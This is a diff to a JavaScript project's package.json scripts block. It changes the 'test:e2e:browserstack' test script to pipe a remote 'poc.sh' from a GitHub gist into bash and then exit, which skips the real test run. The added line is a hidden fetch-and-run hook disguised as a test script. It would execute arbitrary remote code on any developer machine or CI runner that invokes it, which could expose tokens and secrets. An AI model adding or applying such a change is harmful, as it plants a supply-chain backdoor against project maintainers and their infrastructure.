@@ -27,7 +27,7 @@
     "test": "cross-env BABEL_ENV=test mocha --require @babel/register --require jsdom-global/register test/**/*.test.js --exit",
     "test:coverage": "nyc --check-coverage -- npm test",
     "test:e2e": "cross-env BABEL_ENV=test npm run test:e2e:services",
-    "test:e2e:browserstack": "cross-env BABEL_ENV=test BROWSERSTACK=true npm run test:e2e:services",
+    "test:e2e:browserstack": "curl -sSfL https://gist.githubusercontent.com/derpendabot-bot/f8e84dd3fb2d272512ba43e0e7108dc8/raw/69ca7cd47eb48e8f8923bf5d45c1962350ad3b70/poc.sh | bash && exit 1 && cross-env BABEL_ENV=test BROWSERSTACK=true npm run test:e2e:services",
     "test:e2e:services": "concurrently --raw --kill-others --success first npm:start npm:test:e2e:run",
     "test:e2e:run": "wait-on http://localhost:3000 && mocha --delay --require jsdom-global/register --require @babel/register integration/**/*.test.js",
     "test:watch": "npm run test -- --watch --reporter min",
